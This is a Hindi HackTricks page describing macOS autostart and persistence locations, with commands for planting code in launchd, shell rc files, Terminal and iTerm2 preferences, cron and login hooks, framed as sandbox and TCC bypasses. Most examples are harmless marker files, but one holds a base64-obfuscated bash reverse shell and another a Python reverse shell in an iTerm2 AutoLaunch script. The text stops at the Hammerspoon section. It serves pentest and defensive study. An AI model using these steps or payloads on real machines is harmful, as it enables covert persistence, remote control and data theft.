# macOS ऑटो स्टार्ट

{% hint style="success" %}
सीखें और AWS हैकिंग का अभ्यास करें:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
सीखें और GCP हैकिंग का अभ्यास करें: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमारा अनुसरण करें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}

यह अनुभाग ब्लॉग श्रृंखला [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) पर आधारित है, जिसका लक्ष्य है **अधिक ऑटोस्टार्ट स्थान** जोड़ना (यदि संभव हो) और यह संकेत देना कि **कौन सी तकनीकें आजकल काम कर रही हैं** नवीनतम macOS (13.4) के संस्करण के साथ और आवश्यक **अनुमतियों** को निर्दिष्ट करना।

## सैंडबॉक्स बायपास

{% hint style="success" %}
यहाँ आप **सैंडबॉक्स बायपास** के लिए उपयोगी स्टार्ट स्थान पा सकते हैं जो आपको **किसी चीज़ को फ़ाइल में लिखकर** और **बहुत सामान्य** **क्रिया**, एक निर्धारित **समय** या एक **क्रिया जिसे आप आमतौर पर** सैंडबॉक्स के अंदर बिना रूट अनुमतियों की आवश्यकता के कर सकते हैं, द्वारा सरलता से निष्पादित करने की अनुमति देता है।
{% endhint %}

### Launchd

* सैंडबॉक्स बायपास के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* **`/Library/LaunchAgents`**
* **ट्रिगर**: रिबूट
* रूट आवश्यक
* **`/Library/LaunchDaemons`**
* **ट्रिगर**: रिबूट
* रूट आवश्यक
* **`/System/Library/LaunchAgents`**
* **ट्रिगर**: रिबूट
* रूट आवश्यक
* **`/System/Library/LaunchDaemons`**
* **ट्रिगर**: रिबूट
* रूट आवश्यक
* **`~/Library/LaunchAgents`**
* **ट्रिगर**: फिर से लॉगिन
* **`~/Library/LaunchDemons`**
* **ट्रिगर**: फिर से लॉगिन

{% hint style="success" %}
एक दिलचस्प तथ्य के रूप में, **`launchd`** में Mach-o अनुभाग `__Text.__config` में एक एम्बेडेड प्रॉपर्टी लिस्ट है जिसमें अन्य प्रसिद्ध सेवाएँ शामिल हैं जिन्हें launchd को शुरू करना चाहिए। इसके अलावा, इन सेवाओं में `RequireSuccess`, `RequireRun` और `RebootOnSuccess` हो सकते हैं जिसका अर्थ है कि उन्हें चलाना और सफलतापूर्वक पूरा करना चाहिए।

बेशक, इसे कोड साइनिंग के कारण संशोधित नहीं किया जा सकता है।
{% endhint %}

#### विवरण और शोषण

**`launchd`** OX S कर्नेल द्वारा स्टार्टअप पर निष्पादित होने वाली **पहली** **प्रक्रिया** है और शटडाउन पर समाप्त होने वाली अंतिम प्रक्रिया है। इसे हमेशा **PID 1** होना चाहिए। यह प्रक्रिया **ASEP** **plist** में निर्दिष्ट कॉन्फ़िगरेशन को **पढ़ेगी और निष्पादित करेगी**:

* `/Library/LaunchAgents`: व्यवस्थापक द्वारा स्थापित प्रति-उपयोगकर्ता एजेंट
* `/Library/LaunchDaemons`: व्यवस्थापक द्वारा स्थापित प्रणाली-व्यापी डेमन
* `/System/Library/LaunchAgents`: Apple द्वारा प्रदान किए गए प्रति-उपयोगकर्ता एजेंट।
* `/System/Library/LaunchDaemons`: Apple द्वारा प्रदान किए गए प्रणाली-व्यापी डेमन।

जब एक उपयोगकर्ता लॉग इन करता है, तो `/Users/$USER/Library/LaunchAgents` और `/Users/$USER/Library/LaunchDemons` में स्थित plist को **लॉग इन उपयोगकर्ताओं की अनुमतियों** के साथ शुरू किया जाता है।

एजेंट और डेमन के बीच का **मुख्य अंतर यह है कि एजेंट तब लोड होते हैं जब उपयोगकर्ता लॉग इन करता है और डेमन सिस्टम स्टार्टअप पर लोड होते हैं** (क्योंकि ऐसे सेवाएँ हैं जैसे ssh जिन्हें किसी भी उपयोगकर्ता के सिस्टम में पहुँचने से पहले निष्पादित करने की आवश्यकता होती है)। इसके अलावा, एजेंट GUI का उपयोग कर सकते हैं जबकि डेमन को बैकग्राउंड में चलाना आवश्यक है।
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
यहां ऐसे मामले हैं जहां **एजेंट को उपयोगकर्ता लॉगिन करने से पहले निष्पादित करने की आवश्यकता होती है**, इन्हें **PreLoginAgents** कहा जाता है। उदाहरण के लिए, यह लॉगिन पर सहायक तकनीक प्रदान करने के लिए उपयोगी है। इन्हें `/Library/LaunchAgents` में भी पाया जा सकता है (उदाहरण के लिए [**यहां**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) देखें)।

{% hint style="info" %}
नए डेमन्स या एजेंट कॉन्फ़िग फ़ाइलें **अगली रिबूट के बाद या** `launchctl load <target.plist>` का उपयोग करके **लोड की जाएंगी**। यह **बिना उस एक्सटेंशन के .plist फ़ाइलों को लोड करना भी संभव है** `launchctl -F <file>` के साथ (हालांकि वे plist फ़ाइलें रिबूट के बाद स्वचालित रूप से लोड नहीं होंगी)।\
इसे **अनलोड** करना भी संभव है `launchctl unload <target.plist>` के साथ (इससे संबंधित प्रक्रिया समाप्त हो जाएगी),

यह **सुनिश्चित करने के लिए** कि कोई **भी** (जैसे कि एक ओवरराइड) **एजेंट** या **डेमन** **के चलने** में **रोकावट** नहीं कर रहा है, चलाएं: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

वर्तमान उपयोगकर्ता द्वारा लोड किए गए सभी एजेंटों और डेमनों की सूची बनाएं:
```bash
launchctl list
```
{% hint style="warning" %}
यदि एक plist एक उपयोगकर्ता द्वारा स्वामित्व में है, भले ही यह एक डेमन सिस्टम वाइड फ़ोल्डर में हो, तो **कार्य उपयोगकर्ता के रूप में निष्पादित होगा** और न कि रूट के रूप में। यह कुछ विशेषाधिकार वृद्धि हमलों को रोक सकता है।
{% endhint %}

#### launchd के बारे में अधिक जानकारी

**`launchd`** पहला उपयोगकर्ता मोड प्रक्रिया है जो **kernel** से शुरू होती है। प्रक्रिया प्रारंभ **सफल** होना चाहिए और यह **बंद या क्रैश** नहीं हो सकती। यह कुछ **किलिंग सिग्नल्स** के खिलाफ भी **संरक्षित** है।

`launchd` द्वारा की जाने वाली पहली चीजों में से एक सभी **डेमन्स** को **शुरू करना** है जैसे:

* **टाइमर डेमन्स** जो निष्पादित होने के लिए समय पर आधारित हैं:
* atd (`com.apple.atrun.plist`): इसका `StartInterval` 30 मिनट है
* crond (`com.apple.systemstats.daily.plist`): इसका `StartCalendarInterval` 00:15 पर शुरू करने के लिए है
* **नेटवर्क डेमन्स** जैसे:
* `org.cups.cups-lpd`: TCP में सुनता है (`SockType: stream`) `SockServiceName: printer` के साथ
* SockServiceName या तो एक पोर्ट या `/etc/services` से एक सेवा होनी चाहिए
* `com.apple.xscertd.plist`: TCP में पोर्ट 1640 पर सुनता है
* **पाथ डेमन्स** जो एक निर्दिष्ट पाथ के बदलने पर निष्पादित होते हैं:
* `com.apple.postfix.master`: पाथ `/etc/postfix/aliases` की जांच कर रहा है
* **IOKit सूचनाएँ डेमन्स**:
* `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
* **Mach पोर्ट:**
* `com.apple.xscertd-helper.plist`: यह `MachServices` प्रविष्टि में नाम `com.apple.xscertd.helper` को इंगित कर रहा है
* **UserEventAgent:**
* यह पिछले वाले से अलग है। यह launchd को विशिष्ट घटना के जवाब में ऐप्स उत्पन्न करने के लिए बनाता है। हालाँकि, इस मामले में, शामिल मुख्य बाइनरी `launchd` नहीं है बल्कि `/usr/libexec/UserEventAgent` है। यह SIP प्रतिबंधित फ़ोल्डर /System/Library/UserEventPlugins/ से प्लगइन्स लोड करता है जहाँ प्रत्येक प्लगइन अपने प्रारंभकर्ता को `XPCEventModuleInitializer` कुंजी में या पुराने प्लगइन्स के मामले में, इसके `Info.plist` के कुंजी `FB86416D-6164-2070-726F-70735C216EC0` के तहत `CFPluginFactories` शब्दकोश में इंगित करता है।

### शेल स्टार्टअप फ़ाइलें

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* लेकिन आपको एक ऐप ढूंढने की आवश्यकता है जिसमें एक TCC बायपास हो जो एक शेल निष्पादित करता है जो इन फ़ाइलों को लोड करता है

#### स्थान

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **ट्रिगर**: zsh के साथ एक टर्मिनल खोलें
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **ट्रिगर**: zsh के साथ एक टर्मिनल खोलें
* रूट की आवश्यकता है
* **`~/.zlogout`**
* **ट्रिगर**: zsh के साथ एक टर्मिनल से बाहर निकलें
* **`/etc/zlogout`**
* **ट्रिगर**: zsh के साथ एक टर्मिनल से बाहर निकलें
* रूट की आवश्यकता है
* संभावित रूप से अधिक में: **`man zsh`**
* **`~/.bashrc`**
* **ट्रिगर**: bash के साथ एक टर्मिनल खोलें
* `/etc/profile` (काम नहीं किया)
* `~/.profile` (काम नहीं किया)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **ट्रिगर**: xterm के साथ ट्रिगर होने की अपेक्षा की गई, लेकिन यह **स्थापित नहीं है** और स्थापित करने के बाद भी यह त्रुटि फेंकी जाती है: xterm: `DISPLAY is not set`

#### विवरण और शोषण

जब `zsh` या `bash` जैसे शेल वातावरण को प्रारंभ किया जाता है, तो **कुछ स्टार्टअप फ़ाइलें चलती हैं**। macOS वर्तमान में `/bin/zsh` को डिफ़ॉल्ट शेल के रूप में उपयोग करता है। यह शेल स्वचालित रूप से तब पहुंचा जाता है जब टर्मिनल एप्लिकेशन लॉन्च किया जाता है या जब किसी डिवाइस को SSH के माध्यम से एक्सेस किया जाता है। जबकि `bash` और `sh` भी macOS में मौजूद हैं, उन्हें उपयोग करने के लिए स्पष्ट रूप से बुलाया जाना चाहिए।

zsh का मैन पृष्ठ, जिसे हम **`man zsh`** के साथ पढ़ सकते हैं, स्टार्टअप फ़ाइलों का एक लंबा विवरण है।
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### पुनः खोली गई एप्लिकेशन

{% hint style="danger" %}
संकेतित शोषण को कॉन्फ़िगर करना और लॉग आउट और लॉग इन करना या यहां तक कि रिबूट करना मेरे लिए ऐप को निष्पादित करने के लिए काम नहीं किया। (ऐप निष्पादित नहीं हो रहा था, शायद इसे इन क्रियाओं के प्रदर्शन के समय चलना चाहिए)
{% endhint %}

**लेख**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **ट्रिगर**: एप्लिकेशन को पुनः खोलने के लिए पुनरारंभ करें

#### विवरण और शोषण

पुनः खोलने के लिए सभी एप्लिकेशन plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` के अंदर हैं

तो, पुनः खोलने के लिए एप्लिकेशन को अपने स्वयं के एप्लिकेशन को लॉन्च करने के लिए, आपको बस **अपना ऐप सूची में जोड़ना** है।

UUID को उस निर्देशिका को सूचीबद्ध करके या `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` के साथ पाया जा सकता है।

पुनः खोली जाने वाली एप्लिकेशनों की जांच करने के लिए आप कर सकते हैं:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
इस सूची में **एक एप्लिकेशन जोड़ने के लिए** आप उपयोग कर सकते हैं:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* टर्मिनल का उपयोग उपयोगकर्ता के FDA अनुमतियों को प्राप्त करने के लिए किया जाता है

#### Location

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Trigger**: टर्मिनल खोलें

#### Description & Exploitation

**`~/Library/Preferences`** में उपयोगकर्ता की एप्लिकेशन की प्राथमिकताएँ संग्रहीत होती हैं। इनमें से कुछ प्राथमिकताएँ **अन्य एप्लिकेशन/स्क्रिप्ट्स को निष्पादित करने** के लिए एक कॉन्फ़िगरेशन रख सकती हैं।

उदाहरण के लिए, टर्मिनल स्टार्टअप में एक कमांड निष्पादित कर सकता है:

<figure><img src="../.gitbook/assets/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

यह कॉन्फ़िगरेशन फ़ाइल **`~/Library/Preferences/com.apple.Terminal.plist`** में इस प्रकार परिलक्षित होता है:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
तो, यदि सिस्टम में टर्मिनल की प्राथमिकताओं का plist ओवरराइट किया जा सकता है, तो **`open`** कार्यक्षमता का उपयोग **टर्मिनल खोलने और उस कमांड को निष्पादित करने के लिए किया जा सकता है**।

आप इसे cli से जोड़ सकते हैं: 

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### टर्मिनल स्क्रिप्ट / अन्य फ़ाइल एक्सटेंशन

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* टर्मिनल का उपयोग उपयोगकर्ता के FDA अनुमतियों के लिए करें

#### स्थान

* **कहीं भी**
* **ट्रिगर**: टर्मिनल खोलें

#### विवरण और शोषण

यदि आप एक [**`.terminal`** स्क्रिप्ट](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) बनाते हैं और इसे खोलते हैं, तो **टर्मिनल एप्लिकेशन** स्वचालित रूप से वहां निर्दिष्ट कमांड को निष्पादित करने के लिए सक्रिय हो जाएगा। यदि टर्मिनल ऐप के पास कुछ विशेष विशेषाधिकार हैं (जैसे TCC), तो आपका कमांड उन विशेष विशेषाधिकारों के साथ चलाया जाएगा।

इसे आजमाएं:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
आप **`.command`**, **`.tool`** एक्सटेंशन का उपयोग भी कर सकते हैं, जिनमें नियमित शेल स्क्रिप्ट सामग्री होती है और इन्हें भी टर्मिनल द्वारा खोला जाएगा।

{% hint style="danger" %}
यदि टर्मिनल के पास **पूर्ण डिस्क एक्सेस** है, तो यह उस क्रिया को पूरा करने में सक्षम होगा (ध्यान दें कि निष्पादित कमांड एक टर्मिनल विंडो में दिखाई देगा)।
{% endhint %}

### ऑडियो प्लगइन्स

लेख: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
लेख: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [🟠](https://emojipedia.org/large-orange-circle)
* आपको कुछ अतिरिक्त TCC एक्सेस मिल सकता है

#### स्थान

* **`/Library/Audio/Plug-Ins/HAL`**
* रूट आवश्यक
* **ट्रिगर**: coreaudiod या कंप्यूटर को पुनरारंभ करें
* **`/Library/Audio/Plug-ins/Components`**
* रूट आवश्यक
* **ट्रिगर**: coreaudiod या कंप्यूटर को पुनरारंभ करें
* **`~/Library/Audio/Plug-ins/Components`**
* **ट्रिगर**: coreaudiod या कंप्यूटर को पुनरारंभ करें
* **`/System/Library/Components`**
* रूट आवश्यक
* **ट्रिगर**: coreaudiod या कंप्यूटर को पुनरारंभ करें

#### विवरण

पिछले लेखों के अनुसार, **कुछ ऑडियो प्लगइन्स को संकलित करना** और उन्हें लोड करना संभव है।

### क्विकलुक प्लगइन्स

लेख: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [🟠](https://emojipedia.org/large-orange-circle)
* आपको कुछ अतिरिक्त TCC एक्सेस मिल सकता है

#### स्थान

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### विवरण और शोषण

क्विकलुक प्लगइन्स को तब निष्पादित किया जा सकता है जब आप **एक फ़ाइल का पूर्वावलोकन ट्रिगर करते हैं** (फाइंडर में फ़ाइल का चयन करते समय स्पेस बार दबाएं) और एक **प्लगइन जो उस फ़ाइल प्रकार का समर्थन करता है** स्थापित है।

यह संभव है कि आप अपना खुद का क्विकलुक प्लगइन संकलित करें, इसे पिछले स्थानों में से एक में रखें ताकि इसे लोड किया जा सके और फिर एक समर्थित फ़ाइल पर जाएं और इसे ट्रिगर करने के लिए स्पेस दबाएं।

### ~~लॉगिन/लॉगआउट हुक~~

{% hint style="danger" %}
यह मेरे लिए काम नहीं किया, न ही उपयोगकर्ता LoginHook के साथ और न ही रूट LogoutHook के साथ
{% endhint %}

**लेख**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* आपको कुछ ऐसा निष्पादित करने में सक्षम होना चाहिए जैसे `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

वे अप्रचलित हैं लेकिन उपयोगकर्ता लॉगिन करते समय कमांड निष्पादित करने के लिए उपयोग किए जा सकते हैं।
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
यह सेटिंग `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` में संग्रहीत है।
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
इसे हटाने के लिए:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
The root user one is stored in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

{% hint style="success" %}
यहाँ आप **sandbox bypass** के लिए उपयोगी प्रारंभ स्थान पा सकते हैं जो आपको **किसी फ़ाइल में लिखकर** और **विशिष्ट "कार्यक्रमों के स्थापित होने, "असामान्य" उपयोगकर्ता** क्रियाओं या वातावरणों जैसी अपेक्षाकृत सामान्य स्थितियों की उम्मीद न करके** कुछ निष्पादित करने की अनुमति देता है।
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Sandbox को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* हालाँकि, आपको `crontab` बाइनरी निष्पादित करने में सक्षम होना चाहिए
* या रूट होना चाहिए
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* सीधे लिखने के लिए रूट की आवश्यकता है। यदि आप `crontab <file>` निष्पादित कर सकते हैं तो रूट की आवश्यकता नहीं है
* **Trigger**: क्रोन कार्य पर निर्भर करता है

#### Description & Exploitation

वर्तमान उपयोगकर्ता के क्रोन कार्यों की सूची बनाएं:
```bash
crontab -l
```
आप उपयोगकर्ताओं के सभी क्रॉन कार्य भी देख सकते हैं **`/usr/lib/cron/tabs/`** और **`/var/at/tabs/`** (रूट की आवश्यकता है)।

MacOS में कुछ फ़ोल्डर हैं जो **विशिष्ट आवृत्ति** के साथ स्क्रिप्ट निष्पादित करते हैं:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
आप वहाँ नियमित **cron** **jobs**, **at** **jobs** (जिनका बहुत उपयोग नहीं होता) और **periodic** **jobs** (मुख्य रूप से अस्थायी फ़ाइलों को साफ़ करने के लिए उपयोग किया जाता है) पा सकते हैं। दैनिक आवधिक कार्यों को उदाहरण के लिए इस तरह चलाया जा सकता है: `periodic daily`।

एक **user cronjob programatically** जोड़ने के लिए, इसका उपयोग करना संभव है:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 को TCC अनुमतियाँ दी गई थीं

#### स्थान

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Trigger**: iTerm खोलें
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Trigger**: iTerm खोलें
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Trigger**: iTerm खोलें

#### विवरण और शोषण

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** में संग्रहीत स्क्रिप्ट्स निष्पादित की जाएंगी। उदाहरण के लिए:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
या:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
स्क्रिप्ट **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** भी निष्पादित की जाएगी:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
iTerm2 की प्राथमिकताएँ **`~/Library/Preferences/com.googlecode.iterm2.plist`** में स्थित हैं, जो **iTerm2 टर्मिनल खुलने पर निष्पादित करने के लिए एक कमांड को इंगित कर सकती हैं**।

यह सेटिंग iTerm2 सेटिंग्स में कॉन्फ़िगर की जा सकती है:

<figure><img src="../.gitbook/assets/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

और कमांड प्राथमिकताओं में परिलक्षित होता है:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
आप कमांड सेट कर सकते हैं जिसे निष्पादित करना है:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
बहुत संभावना है कि **iTerm2 प्राथमिकताओं का दुरुपयोग करने के अन्य तरीके** हैं ताकि मनमाने आदेशों को निष्पादित किया जा सके।
{% endhint %}

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन xbar को स्थापित होना चाहिए
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* यह पहुंच अनुमति की मांग करता है

#### स्थान

* **`~/Library/Application\ Support/xbar/plugins/`**
* **ट्रिगर**: एक बार xbar निष्पादित होने पर

#### विवरण

यदि लोकप्रिय प्रोग्राम [**xbar**](https://github.com/matryer/xbar) स्थापित है, तो **`~/Library/Application\ Support/xbar/plugins/`** में एक शेल स्क्रिप्ट लिखना संभव है जो xbar शुरू होने पर निष्पादित होगी:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Sandbox को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन Hammerspoon को स्थापित करना आवश्यक है
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* यह Accessibility अनुमतियों की मांग करता है

#### Location

* **`~/.hammerspoon/init.lua`**
* **Trigger**: एक बार hammerspoon निष्पादित होने पर

#### Description

